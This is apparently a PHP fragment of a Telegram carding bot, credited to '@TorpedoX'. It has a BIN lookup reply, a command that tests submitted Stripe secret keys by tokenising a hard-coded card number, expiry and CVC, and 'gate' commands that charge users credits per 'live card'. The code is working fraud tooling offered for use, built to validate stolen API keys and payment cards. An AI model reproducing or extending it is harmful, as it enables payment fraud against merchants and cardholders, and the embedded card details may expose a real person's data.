$resbin = "<b>----------[ BIN - LOOKUP ]----------</b>%0A<u>BIN</u>: <b>".$bin."</b>%0A<u>TYPE</u>: <b>".$type."</b>%0A<u>BRAND</u>: <b>".$brand."</b>%0A<u>PREPAID</u>: <b>".$prepaid."</b>%0A<u>COUNTRY</u>: <b>".$country." ".$emoji." ".$currency."</b>%0A<u>BANK</u>: <b>".$bank."</b>%0A<u>URL</u>: <b>".$bank_url."</b>%0A<u>PHONE</u>: <b>".$bphone."</b>%0A%0A<u>Checked by</u>: @$username";

reply_tp($chatId,$message_id,$resbin);

}

}

//////////=========[Sk Key Check Command]=========//////////

elseif ((strpos($message, "!sk") === 0)||(strpos($message, "/sk") === 0)||
(strpos($message,".sk") === 0)){
$sec = substr($message, 4);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5154620061414478&card[exp_month]=01&card[exp_year]=2023&card[cvc]=235");
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
if (strpos($result, 'api_key_expired')){
reply_tp($chatId,$message_id, "<u>Key:</u> <code>$sec</code>%0A<u>Response:</u> Key Expired❌%0A<i>Checked by @$username</i>");
}
elseif (strpos($result, 'Invalid API Key provided')){
reply_tp($chatId,$message_id, "<u>Key:</u> <code>$sec</code>%0A<u>Response:</u> Invalid Key❌%0A<i>Checked by @$username</i>");
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
reply_tp($chatId,$message_id, "<u>Key:</u> <code>$sec</code>%0A<u>Response:</u> Test Mode Charges❌%0A<i>Checked by @$username</i>");
}else{
reply_tp($chatId,$message_id, "<u>Key:</u> <code>$sec</code>%0A<u>Response:</u> Key Live✅%0A<i>Checked by @$username</i>");
}}
////////////////////////////////////////////////////////////////////////////////////////
# -----------------------------------------
/*

With every gate call to function checkaccess($chatId) first to check access
Then call to function check_credits($userId,$chatId) to check registration and credits

with every live card you can call to function reduce_on_lives($userId,$amount,$chatId) $amount = the amount u wanna reduce on lives
call to this atlast only when check_credits is done already

*/
#------------------------------------------

# ------- EXAMPLE GATE THAT CHECK ACCESS THEN BALANCE AND REDUCE 5 IF ALL GOOD (REDUCE PER YOUR CHOICE)
elseif (strpos($message, "/tst") === 0){

checkaccess($chatId); 
check_credits($userId,$chatId);

$mssg = "<i>You are registered have credits and 5 Points have benn deducted from ur balance</i>";
sendMessage($chatId,$mssg);

reduce_on_lives($userId,$amount,$chatId);

}

elseif (strpos($message, "/chk2") === 0){
checkaccess($chatId); 
check_credits($userId,$chatId);

$mssg = "<i>You are registered have credits and 5 Points have benn ADDED TO ur balance</i>";
sendMessage($chatId,$mssg);

increse_credits($userId,$amount_incr,$chatId);

}


# ======================================================
/*
  -----------------============= [MADE BY @TorpedoX] =============-----------------
*/
# ==========================
